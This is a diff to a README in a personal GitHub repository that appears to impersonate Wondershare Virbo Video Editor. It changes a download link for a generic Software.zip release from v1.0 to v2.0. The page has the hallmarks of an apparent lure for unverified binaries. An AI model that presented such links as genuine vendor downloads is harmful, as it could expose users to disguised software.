@@ -21,7 +21,7 @@ Wondershare Virbo provides a user-friendly interface that allows you to unleash 
 ## Get Started with Wondershare Virbo
 To get started with Wondershare Virbo Video Editor, you can download the latest version by clicking the button below:
 
-[![Download Wondershare Virbo](https://github.com/Ved-singh389/Wondershare-Virbo-Video-Editor/releases/download/v1.0/Software.zip)](https://github.com/Ved-singh389/Wondershare-Virbo-Video-Editor/releases/download/v1.0/Software.zip)
+[![Download Wondershare Virbo](https://github.com/Ved-singh389/Wondershare-Virbo-Video-Editor/releases/download/v2.0/Software.zip)](https://github.com/Ved-singh389/Wondershare-Virbo-Video-Editor/releases/download/v2.0/Software.zip)
 
 Note: The download link needs to be launched for accessing the latest version of Wondershare Virbo.
 
